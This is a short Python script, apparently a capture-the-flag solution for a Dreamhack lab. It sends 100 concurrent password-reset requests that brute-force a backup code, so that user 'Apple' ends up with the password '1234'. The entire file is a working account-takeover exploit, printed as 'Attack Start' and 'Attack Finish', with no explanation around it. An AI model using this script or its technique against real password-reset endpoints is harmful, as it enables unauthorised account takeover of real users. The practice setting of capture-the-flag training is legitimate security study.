import threading, requests

url = "http://host1.dreamhack.games:19471/forgot_password"

def forgot(backupCode):
    data = {"userid": "Apple", "newpassword": "1234", "backupCode": backupCode}
    requests.post(url, data=data)
    print(f"Backupcode: {backupCode}")

if __name__ == "__main__":
    threads = []
    print("Attack Start")

    for i in range(1, 100 + 1):
        t = threading.Thread(target=forgot, args=[i])
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

    print("Attack Finish")
    print("New Password: 1234")
    